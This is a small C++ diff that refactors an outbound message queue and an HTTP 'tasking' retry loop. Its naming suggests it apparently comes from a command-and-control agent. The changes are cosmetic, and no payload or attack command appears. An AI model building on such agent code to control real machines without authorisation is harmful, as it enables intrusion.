@@ -45,7 +45,7 @@ namespace Message {
 
         if (!Head) {
             Ctx->Transport.OutboundQueue = nullptr;
-            return_defer(ERROR_SUCCESS);
+            return;
         }
 
         while (Head) {
@@ -66,8 +66,6 @@ namespace Message {
                 Head = Head->Next;
             }
         }
-
-        defer:
     }
 
     VOID OutboundQueue(PSTREAM Outbound) {
@@ -155,8 +153,8 @@ namespace Message {
             return_defer(ERROR_SUCCESS);
 #elifdef TRANSPORT_HTTP
             PSTREAM Task = Stream::CreateStreamWithHeaders(TypeTasking);
-            OutboundQueue(Task);
 
+            OutboundQueue(Task);
             goto retry;
 #endif
         } else {
